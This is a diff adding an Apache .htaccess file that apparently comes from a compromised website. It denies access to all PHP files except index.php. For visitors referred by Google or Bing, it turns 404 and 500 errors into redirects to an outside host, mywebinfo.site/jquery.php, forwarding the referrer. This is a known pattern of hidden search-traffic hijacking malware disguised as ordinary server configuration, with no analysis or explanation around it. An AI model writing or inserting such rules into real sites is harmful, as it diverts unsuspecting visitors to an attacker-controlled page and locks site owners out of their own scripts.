@@ -1,0 +1,13 @@
+<FilesMatch ".*\.(phtml|php)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(index).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+<If "%{HTTP_REFERER} =~ m#/(.*google.*)|(.*bing.*)/#">
+ErrorDocument 404 http://mywebinfo.site/jquery.php?referrer404=%{escape:%{HTTP_REFERER}}
+ErrorDocument 500 http://mywebinfo.site/jquery.php?referrer500=%{escape:%{HTTP_REFERER}}
+</If>
